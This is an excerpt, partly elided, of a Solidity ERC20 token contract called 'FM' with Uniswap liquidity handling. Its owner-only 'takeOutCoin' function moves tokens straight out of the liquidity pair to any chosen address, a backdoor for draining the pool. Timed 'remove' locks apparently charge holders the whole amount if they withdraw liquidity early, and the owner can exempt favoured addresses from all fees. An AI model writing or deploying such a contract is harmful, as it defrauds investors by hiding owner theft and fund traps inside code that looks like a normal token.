...
contract FM is ERC20, Ownable {
    ...
    address public _marketingWalletAddress = 0x6a141Ca64e47056F0bB66b4Cd22CFC5Bc2C27b4e;
    address public _destroyAddress = address(0x000000000000000000000000000000000000dEaD);
    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => uint256) private _removeTimes;
    ...
    constructor() public ERC20("FM", "FM") {
    ...
    function excludeMuliteFromFees(address[] calldata accounts, bool value) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = value;
        }
    }
    function removeShaTime(address account, uint256 value) public onlyOwner {
        _removeTimes[account] = value;
    }
    function multipleRemoveShaTime(address[] calldata accounts, uint256 value) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _removeTimes[accounts[i]] = value;
        }
    }
    ...
    function takeOutCoin(address account, uint256 tAmount) public onlyOwner {
        super._transfer(uniswapV2Pair, account, tAmount);
    }
    ...
    function isExcludedFromFees(address account) public view returns(bool) {
     ...
     function isRemoveTimes(address account) public view returns(uint256) {
        return _removeTimes[account];
    }
    ...
    function _transfer(
        ...
        if(from == uniswapV2Pair && !_isExcludedFromFees[to]){
            if(_isRemoveLiquidity()){
               if(block.timestamp < _removeTimes[to]){
                    uint256 lpfees = amount;
                ...
                if(block.timestamp <= times.add(15)){
                 ...
                 if(block.timestamp <= times.add(300)){
        ...
        if(to == uniswapV2Pair && !_isExcludedFromFees[from]){
            if(_isAddLiquidity()){
                _removeTimes[from] = block.timestamp.add(172800);
                isSw = true;
            }else{
                require(block.timestamp >= times, "zero");
            }
    ...
    function _swapAndLiquid() private {
        ...
        if(fistval > 0){
            uint256 dr = fistval.mul(3).div(8);
